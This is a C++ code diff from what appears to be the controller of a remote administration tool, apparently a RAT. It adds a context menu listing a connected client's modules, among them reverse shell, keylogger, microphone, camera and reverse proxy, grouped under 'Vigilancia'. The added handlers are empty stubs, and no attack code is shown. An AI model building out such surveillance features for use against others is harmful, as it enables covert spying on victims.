@@ -762,6 +762,21 @@ TransferStatus Cliente_Handler::Transfer_Get(int index) {
     std::unique_lock<std::mutex> lock(this->mt_Archivos);
     return this->vcArchivos_Descarga[index].transfer;
 }
+
+std::vector<std::string> Cliente_Handler::vc_GetMods() {
+    const char *mod_names[] = { "Shell Inversa", "Microfono", "Keylogger", "Camara",
+                                    "Escritorio Remoto", "Administrador de Ventanas",
+                                    "Informacion", "Escaner de Red", "Bromas",
+                                    "Administrador de Archivos", "Proxy Inversa", "Admin Procesos"};
+    std::vector<std::string> vcOut;
+    for (size_t i = 0; i < MODS_SIZE-1; i++) {
+        if (this->p_Cliente.mods[i] == '1') {
+            vcOut.push_back(mod_names[i]);
+        }
+    }
+
+    return vcOut;
+}
 //##################################################################################
 
 //Crear el frame principal para interactuar con el cliente
@@ -1494,19 +1509,110 @@ Servidor::~Servidor() {
 
 //Mostrar menu contextual frame princiopal
 void MyListCtrl::ShowContextMenu(const wxPoint& pos, long item) {
+    DEBUG_MSG(this->strTmp);
+    int iCliIndex = p_Servidor->IndexOf(this->strTmp.ToStdString());
+    if (iCliIndex != -1) {
+        wxMenu menu;
+        wxMenu* subMenuSpy = new wxMenu;
+        wxMenu* subMenuMisc = new wxMenu;
+        wxMenu* subMenuRed = new wxMenu;
 
-    wxMenu menu;
-    menu.Append(EnumIDS::ID_Interactuar, "Administrar");
+        std::vector<std::string> vcMods = p_Servidor->vc_Clientes[iCliIndex]->vc_GetMods();
+        if (vcMods.size() > 0) {
+            for (std::string& item : vcMods) {
+                //Vigilancia
+                if (item == "Microfono"){
+                    subMenuSpy->Append(EnumMenuMods::ID_OnMicrofono, item);
+                    continue;
+                } 
+                if (item == "Keylogger") {
+                    subMenuSpy->Append(EnumMenuMods::ID_OnKeyloger, item);
+                    continue;
+                }
+                if (item == "Camara") {
+                    subMenuSpy->Append(EnumMenuMods::ID_OnCamara, item);
+                    continue;
+                }
 
-    wxMenu* subMenu1 = new wxMenu;
-    subMenu1->Append(EnumIDS::ID_CerrarProceso, "Matar proceso");
-    subMenu1->Append(EnumIDS::ID_ReiniciarCliente, "Reiniciar conexion");
 
-    menu.AppendSubMenu(subMenu1, "Cliente");
-    menu.AppendSeparator();
-    menu.Append(EnumIDS::ID_Refrescar, "Refrescar");
-    
-    PopupMenu(&menu, pos.x, pos.y);
+                //Misc
+                if (item == "Administrador de Ventanas"){
+                    subMenuMisc->Append(EnumMenuMods::ID_OnAdminVentanas, item);
+                    continue;
+                }
+                if (item == "Bromas") {
+                    subMenuMisc->Append(EnumMenuMods::ID_OnBromas, item);
+                    continue;
+                }
+
+
+
+                //Red
+                if (item == "Escaner de Red"){
+                    subMenuRed->Append(EnumMenuMods::ID_OnEscanerRed, item);
+                    continue;
+                }
+                if (item == "Proxy Inversa") {
+                    subMenuRed->Append(EnumMenuMods::ID_OnProxyInversa, item);
+                    continue;
+                }
+
+
+                //Shell
+                if (item == "Shell Inversa") {
+                    menu.Append(EnumMenuMods::ID_OnShell, item);
+                    continue;
+                }
+
+                //Escritorio Remoto
+                if (item == "Escritorio Remoto") {
+                    menu.Append(EnumMenuMods::ID_OnEscritorioRemoto, item);
+                    continue;
+                }
+
+                //Informacion
+                if (item == "Informacion") {
+                    menu.Append(EnumMenuMods::ID_OnInfo, item);
+                    continue;
+                }
+
+                //Administrador de Archivos
+                if (item == "Administrador de Archivos") {
+                    menu.Append(EnumMenuMods::ID_OnAdminArchivos, item);
+                    continue;
+                }
+
+                //Admin de Procesos
+                if (item == "Administrador de Archivos") {
+                    menu.Append(EnumMenuMods::ID_OnAdminProcesos, item);
+                    continue;
+                }
+            }
+
+            if (subMenuSpy->GetMenuItemCount() > 0) {
+                menu.AppendSubMenu(subMenuSpy, "Vigilancia");
+            }
+            if (subMenuMisc->GetMenuItemCount() > 0) {
+                menu.AppendSubMenu(subMenuMisc, "Miscelaneo");
+            }
+            if (subMenuRed->GetMenuItemCount() > 0) {
+                menu.AppendSubMenu(subMenuRed, "Red");
+            }
+
+            menu.AppendSeparator();
+        }
+
+        wxMenu* subMenu1 = new wxMenu;
+        subMenu1->Append(EnumIDS::ID_CerrarProceso, "Matar proceso");
+        subMenu1->Append(wxID_ANY, "Actualizar cliente")->Enable(false);
+        subMenu1->Append(EnumIDS::ID_ReiniciarCliente, "Reiniciar conexion");
+
+        menu.AppendSubMenu(subMenu1, "Cliente");
+        menu.AppendSeparator();
+        menu.Append(EnumIDS::ID_Refrescar, "Refrescar");
+
+        PopupMenu(&menu, pos.x, pos.y);
+    }
 }
 
 void MyListCtrl::OnContextMenu(wxContextMenuEvent& event){
@@ -1535,10 +1641,10 @@ void MyListCtrl::OnContextMenu(wxContextMenuEvent& event){
 
         wxString st1 = this->GetItemText(iItem, 0);
         this->strTmp = st1;
-        this->strTmp.append(1, '/');
+        /*this->strTmp.append(1, '/');
         this->strTmp += this->GetItemText(iItem, 1);
         this->strTmp.append(1, '/');
-        this->strTmp += this->GetItemText(iItem, 2);
+        this->strTmp += this->GetItemText(iItem, 2);*/
 
         ShowContextMenu(point, iItem);
     }
@@ -1549,16 +1655,17 @@ void MyListCtrl::OnContextMenu(wxContextMenuEvent& event){
 }
 
 void MyListCtrl::OnInteractuar(wxCommandEvent& event) {
-    std::vector<std::string> vcOut = strSplit(this->strTmp.ToStdString(), '/', 1);
+    /*std::vector<std::string> vcOut = strSplit(this->strTmp.ToStdString(), '/', 1);
     int iCliIndex = p_Servidor->IndexOf(vcOut[0]);
     
     if (iCliIndex != -1) {
         p_Servidor->vc_Clientes[iCliIndex]->CrearFrame(this->strTmp.ToStdString(), vcOut[0]);
-    }
+    }*/
+    event.Skip();
 }
 
 void MyListCtrl::OnActivated(wxListEvent& event) {
-    if (this->GetItemCount() > 0) {
+    /*if (this->GetItemCount() > 0) {
         wxString strID = this->GetItemText(event.GetIndex(), 0);
         std::unique_lock<std::mutex> lock(vector_mutex);
         for (auto& cliente : p_Servidor->vc_Clientes) {
@@ -1574,7 +1681,8 @@ void MyListCtrl::OnActivated(wxListEvent& event) {
                 break;
             }
         }
-    }
+    }*/
+    event.Skip();
 }
 
 void MyListCtrl::OnRefrescar(wxCommandEvent& event) {
@@ -1593,4 +1701,52 @@ void MyListCtrl::OnMatarProceso(wxCommandEvent& event) {
         p_Servidor->cChunkSend(p_Servidor->vc_Clientes[iCliIndex]->p_Cliente._sckCliente, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, false, EnumComandos::CLI_STOP);
         p_Servidor->m_CerrarConexion(p_Servidor->vc_Clientes[iCliIndex]->p_Cliente._sckCliente);
     }
+}
+
+void MyListCtrl::OnShellInversa(wxCommandEvent& event) {
+    event.Skip();
+}
+
+void MyListCtrl::OnMicrofono(wxCommandEvent& event) {
+    event.Skip();
+}
+
+void MyListCtrl::OnKeylogger(wxCommandEvent& event) {
+    event.Skip();
+}
+
+void MyListCtrl::OnCamara(wxCommandEvent& event) {
+    event.Skip();
+}
+
+void MyListCtrl::OnEscritorioRemoto(wxCommandEvent& event) {
+    event.Skip();
+}
+
+void MyListCtrl::OnAdminVentanas(wxCommandEvent& event) {
+    event.Skip();
+}
+
+void MyListCtrl::OnInfo(wxCommandEvent& event) {
+    event.Skip();
+}
+
+void MyListCtrl::OnEscanerRed(wxCommandEvent& event) {
+    event.Skip();
+}
+
+void MyListCtrl::OnBromas(wxCommandEvent& event) {
+    event.Skip();
+}
+
+void MyListCtrl::OnAdminArchivos(wxCommandEvent& event) {
+    event.Skip();
+}
+
+void MyListCtrl::OnProxyInversa(wxCommandEvent& event) {
+    event.Skip();
+}
+
+void MyListCtrl::OnAdminProcesos(wxCommandEvent& event) {
+    event.Skip();
 }
